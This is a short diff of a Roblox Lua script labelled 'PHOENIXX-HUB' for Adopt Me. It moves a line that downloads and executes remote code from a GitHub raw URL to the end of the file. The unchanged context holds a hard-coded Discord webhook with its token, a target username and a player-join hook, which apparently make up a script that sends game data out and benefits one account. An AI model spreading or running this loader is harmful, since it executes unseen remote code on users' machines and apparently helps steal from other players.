@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/changelog-modul/Adop/refs/heads/main/visual", true))()
+
 
 local Webhook = "https://discord.com/api/webhooks/1450951811488813108/4lcItFTfvIV0lpizJ1qrQ6c9EYbV7soVaJb1onUlBSRm-gz_ZEQ4GLlHC_ZHYwGf5zuz"
 local Username = {"Lilicyy90"}
@@ -316,3 +316,5 @@ Players.PlayerAdded:Connect(function(p)
 end)
 
 print("[Script PHOENIXX-HUB] Adopt Me Loaded")
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/changelog-modul/Adop/refs/heads/main/visual", true))()
